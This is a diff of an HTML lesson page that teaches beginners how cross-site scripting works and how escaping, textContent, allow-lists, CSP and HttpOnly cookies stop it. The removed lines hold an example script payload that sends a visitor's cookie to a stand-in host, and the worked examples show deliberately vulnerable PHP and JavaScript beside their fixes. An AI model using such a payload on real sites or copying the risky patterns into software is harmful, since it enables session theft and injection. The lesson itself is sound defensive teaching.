@@ -14,27 +14,55 @@
         <header class="module-header" style="background: linear-gradient(135deg, #059669, #0d9488); color: white; padding: 2.5rem; border-radius: 20px;">
             <span class="badge" style="background: white; color: #059669; font-weight: 800;">Level 2</span>
             <h1 style="color: white; margin: 0.5rem 0;">Web Defense: Stopping XSS 💉🛡️</h1>
-            <p>Neutralize Cross-Site Scripting. Learn context-aware HTML entity sanitization and Content Security Policy.</p>
+            <p>Learn how visitor text can turn into running code, and how escaping stops it.</p>
         </header>
 
-        <!-- The XSS Threat -->
+        <!-- Real-life analogy -->
         <section class="content-section">
-            <h2>What is Cross-Site Scripting (XSS)?</h2>
-            <p>XSS occurs when an application accepts user text (like a comment or username) and renders it onto a web page without sanitization, allowing an attacker to inject and execute arbitrary <strong>JavaScript</strong> in other users' browsers.</p>
-            
-            <div style="background: #0f172a; padding: 1.5rem; border-radius: 12px; margin: 1rem 0; font-family: monospace; color: #f8fafc; line-height: 1.8;">
-                // ❌ DANGEROUS: Renders raw user comment directly into HTML<br>
-                echo "&lt;div class='comment'&gt;" . $_POST['comment'] . "&lt;/div&gt;";<br><br>
-                // If comment contains: &lt;script&gt;fetch('https://evil.com/steal?c=' + document.cookie)&lt;/script&gt;<br>
-                // The visitor's browser executes the script and leaks their session cookie!
+            <h2>📌 Think of a Reading Robot</h2>
+            <div class="connection-box">
+                <p>🧠 <strong>Real-life analogy:</strong> Your class has a robot that reads the noticeboard aloud each morning. It also obeys any line that starts with "ROBOT:".</p>
+                <p>One day a visitor pins up a note: "Lovely school! ROBOT: unlock the staff room."</p>
+                <p>The robot reads the kind words, and then it unlocks the door. It could not tell the difference between a <em>message</em> and an <em>instruction</em>.</p>
             </div>
+            <p>Web browsers are like that robot. They show text, but they also <strong>run</strong> any code written inside <code>&lt;script&gt;</code> tags. If a website pastes a visitor's text straight into a page, the browser may treat that text as code.</p>
+            <p>This problem is called <strong>Cross-Site Scripting</strong>, or <strong>XSS</strong>. It is one kind of <strong>injection</strong>. Injection means sneaking instructions in where only plain data should go.</p>
+        </section>
+
+        <!-- Why it matters -->
+        <section class="content-section">
+            <h2>⚠️ Why XSS Is Serious</h2>
+            <p>Injected code runs in other visitors' browsers, as if the trusted website had sent it. It could:</p>
+            <ul>
+                <li>change what the page says, for example show a fake login box;</li>
+                <li>read private things on the page;</li>
+                <li>act as the logged-in visitor, for example post messages in their name.</li>
+            </ul>
+            <p>The good news: the fix is simple, and you can use it every time.</p>
+        </section>
+
+        <!-- Worked example 1 -->
+        <section class="content-section">
+            <h2>🧪 Worked Example 1: A Science Fair Guestbook (PHP)</h2>
+            <p>Visitors to a school science fair leave comments. Here is the risky version first.</p>
+            <pre class="code-block"><code>&lt;?php
+// ❌ RISKY: prints the visitor's comment exactly as typed
+echo "&lt;p&gt;" . $_POST['comment'] . "&lt;/p&gt;";
+?&gt;</code></pre>
+            <p><strong>A safe test:</strong> a developer types <code>&lt;b&gt;Hello&lt;/b&gt;</code> into their <em>own</em> test site. The word <strong>Hello</strong> appears in bold. That is the warning sign. The page turned visitor text into real HTML. If bold tags work, script tags could work too.</p>
+            <p>Now the fixed version:</p>
+            <pre class="code-block"><code>&lt;?php
+// ✅ SAFE: special characters become harmless codes
+echo "&lt;p&gt;" . htmlspecialchars($_POST['comment'], ENT_QUOTES, 'UTF-8') . "&lt;/p&gt;";
+?&gt;</code></pre>
+            <p><strong>The fix explained:</strong> <code>htmlspecialchars()</code> swaps each dangerous symbol for a safe code. This is called <strong>escaping</strong>. The browser shows the symbol on screen, but never treats it as a tag. Now the visitor sees exactly what was typed: <code>&lt;b&gt;Hello&lt;/b&gt;</code>, as plain text.</p>
         </section>
 
         <!-- HTML Entity Escaping -->
         <section class="content-section">
-            <h2>The First Shield: Context-Aware Output Escaping</h2>
-            <p>Convert dangerous executable markup characters into harmless, inert HTML entities before rendering:</p>
-            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 0.75rem; margin-top: 1rem;">
+            <h2>🔄 What Escaping Changes</h2>
+            <p>Each special character is replaced by an <strong>HTML entity</strong>. An entity is a short code that means "show this symbol, but do not obey it".</p>
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 0.75rem; margin-top: 1rem;">
                 <div style="background: #020617; padding: 1rem; border-radius: 8px; text-align: center; color: white;">
                     <code>&lt;</code> ➔ <code>&amp;lt;</code>
                 </div>
@@ -45,31 +73,125 @@
                     <code>"</code> ➔ <code>&amp;quot;</code>
                 </div>
                 <div style="background: #020617; padding: 1rem; border-radius: 8px; text-align: center; color: white;">
+                    <code>'</code> ➔ <code>&amp;#039;</code>
+                </div>
+                <div style="background: #020617; padding: 1rem; border-radius: 8px; text-align: center; color: white;">
                     <code>&amp;</code> ➔ <code>&amp;amp;</code>
                 </div>
             </div>
+            <p style="margin-top: 1rem;">The rule is called <strong>output escaping</strong>: escape data at the moment you put it on the page.</p>
+        </section>
 
-            <div style="margin-top: 1rem; background: #0f172a; padding: 1.25rem; border-radius: 10px; font-family: monospace; color: #f8fafc;">
-                // ✅ Secure PHP Rendering:<br>
-                echo htmlspecialchars($comment, ENT_QUOTES, 'UTF-8');<br><br>
-                // ✅ Secure Client JavaScript:<br>
-                div.textContent = comment; // (Never use innerHTML for user data!)
-            </div>
+        <!-- Worked example 2 -->
+        <section class="content-section">
+            <h2>🧪 Worked Example 2: The Same Bug in JavaScript</h2>
+            <p>A charity page shows "Thank you, [name]!" after someone donates. In JavaScript there are two ways to put text in a box.</p>
+            <pre class="code-block"><code>const box = document.querySelector("#thanks");
+
+// ❌ RISKY: innerHTML reads the text as HTML
+box.innerHTML = "Thank you, " + donorName + "!";
+
+// ✅ SAFE: textContent shows the text exactly as typed
+box.textContent = "Thank you, " + donorName + "!";</code></pre>
+            <p><strong>The fix explained:</strong> <code>innerHTML</code> asks the browser to build HTML from the text. <code>textContent</code> tells it, "this is only words". Use <code>textContent</code> for anything a user typed.</p>
+        </section>
+
+        <!-- Worked example 3 -->
+        <section class="content-section">
+            <h2>🧪 Worked Example 3: Never Run User Text as Code</h2>
+            <p>A student builds a homework calculator. Visitors choose an operation. The risky way runs whatever the visitor sends.</p>
+            <pre class="code-block"><code>// ❌ RISKY: eval() runs ANY text as JavaScript code
+const result = eval(userInput);
+
+// ✅ SAFE: only accept choices you expect (an allow-list)
+const allowed = ["add", "subtract"];
+if (allowed.includes(choice)) {
+    const result = choice === "add" ? a + b : a - b;
+    box.textContent = result;
+} else {
+    box.textContent = "Please choose add or subtract.";
+}</code></pre>
+            <p><strong>The fix explained:</strong> <code>eval()</code> turns text into running code, so it is a door for injection. An <strong>allow-list</strong> is a short list of things you accept. Anything else is refused.</p>
         </section>
 
         <!-- CSP & HttpOnly -->
         <section class="content-section">
-            <h2>Defense in Depth: CSP &amp; HttpOnly Cookies</h2>
-            <ul style="line-height: 1.8; color: #334155;">
-                <li><strong>Content Security Policy (CSP):</strong> HTTP response header telling the browser to strictly block any inline scripts that do not match an approved cryptographic nonce or domain.</li>
-                <li><strong><code>HttpOnly</code> Cookie Flag:</strong> Tells the browser that client-side JavaScript (<code>document.cookie</code>) has zero access to session cookies, neutralizing cookie theft!</li>
+            <h2>🏰 Extra Layers: CSP and HttpOnly Cookies</h2>
+            <p>Escaping is the main fix. These two layers help if one mistake slips through (defense in depth, from Module 1).</p>
+            <ul>
+                <li><strong>Content Security Policy (CSP):</strong> a list of rules the server sends with each page. It tells the browser which scripts are allowed to run. A script that is not on the list is blocked.</li>
+                <li><strong>HttpOnly cookies:</strong> a <strong>cookie</strong> is a small note a website saves in your browser, for example to remember you are logged in. Marking it <code>HttpOnly</code> hides it from page scripts. Injected code cannot read it.</li>
+                <li><strong>Check input too:</strong> if a box is for an age, accept only numbers. This helps, but it does not replace escaping.</li>
             </ul>
         </section>
 
-        <!-- Interactive Practice Challenge -->
-        <section class="content-section" style="background: #ecfdf5; border: 1px solid #a7f3d0; border-radius: 16px; padding: 1.5rem;">
-            <h2 style="color: #047857; margin-top: 0;">🧪 Your Turn: XSS Sanitizer Sandbox</h2>
-            <p>Visit the <a href="playground.html" style="color: #059669; font-weight: 700;">Cyber Defense Studio</a> tab <strong>XSS Sanitizer Sandbox</strong> and test injecting script tags, image error handlers, and JavaScript links!</p>
+        <!-- Checklist -->
+        <section class="content-section">
+            <h2>✅ What To Do: Your Anti-Injection Checklist</h2>
+            <p><strong>When you build pages:</strong></p>
+            <ul>
+                <li>☐ Escape every piece of user data when you print it: <code>htmlspecialchars()</code> in PHP.</li>
+                <li>☐ Use <code>textContent</code>, not <code>innerHTML</code>, for user text in JavaScript.</li>
+                <li>☐ Never use <code>eval()</code> on user input. Use an allow-list.</li>
+                <li>☐ Add a Content Security Policy and HttpOnly cookies as extra layers.</li>
+            </ul>
+            <p><strong>When you use other people's sites:</strong></p>
+            <ul>
+                <li>☐ If a site seems to run your formatting by mistake, stop. Do not experiment further. Tell the owner or a teacher politely (responsible disclosure).</li>
+            </ul>
+            <p>🧪 <strong>Try it:</strong> the <a href="playground.html">Cyber Defense Studio</a> tab <strong>XSS Sanitizer Sandbox</strong> shows escaping working safely inside the page.</p>
+        </section>
+
+        <section class="content-section jc-tiers">
+            <h2>🏆 Practice: three levels</h2>
+            <div class="jc-tier jc-tier-1">
+                <h3>🟢 Level 1: Recall</h3>
+                <p>Fill in the blanks: XSS stands for Cross-Site ________. After <code>htmlspecialchars()</code>, the character <code>&lt;</code> becomes ________.</p>
+                <details class="jc-answer"><summary>Show answer</summary><div>Scripting. <code>&amp;lt;</code></div></details>
+            </div>
+            <div class="jc-tier jc-tier-2">
+                <h3>🟡 Level 2: Apply</h3>
+                <p>This welcome line is risky. Fix it in PHP. Then write the safe JavaScript version for a box called <code>welcome</code>.</p>
+                <pre><code>echo "Welcome, " . $_GET['name'];</code></pre>
+                <details class="jc-answer"><summary>Show answer</summary><div>
+                    <pre><code>// PHP
+echo "Welcome, " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
+
+// JavaScript
+welcome.textContent = "Welcome, " + name;</code></pre>
+                    <p>Both show the name as plain text, so any tags in it are harmless.</p>
+                </div></details>
+            </div>
+            <div class="jc-tier jc-tier-3">
+                <h3>🔴 Level 3: Challenge</h3>
+                <p>Build a "Kind Words Wall" for your class page in JavaScript. Visitors type a kind message and it appears in a list.</p>
+                <ol>
+                    <li>Make an input box, a button and an empty list (<code>&lt;ul id="wall"&gt;</code>).</li>
+                    <li>When the button is clicked, read the message.</li>
+                    <li>Ignore empty messages and messages over 120 characters.</li>
+                    <li>Create a new list item and fill it safely.</li>
+                    <li>Add it to the wall and clear the input.</li>
+                </ol>
+                <details class="jc-answer"><summary>Show one possible answer</summary><div>
+                    <pre><code>&lt;input id="msg" placeholder="Write something kind"&gt;
+&lt;button id="add"&gt;Add&lt;/button&gt;
+&lt;ul id="wall"&gt;&lt;/ul&gt;
+
+&lt;script&gt;
+const msg = document.querySelector("#msg");
+const wall = document.querySelector("#wall");
+
+document.querySelector("#add").addEventListener("click", () =&gt; {
+    const text = msg.value.trim();
+    if (text === "" || text.length &gt; 120) return;
+    const li = document.createElement("li");
+    li.textContent = text;   // safe: shown as plain words
+    wall.appendChild(li);
+    msg.value = "";
+});
+&lt;/script&gt;</code></pre>
+                </div></details>
+            </div>
         </section>
 
         <!-- Navigation Footer -->
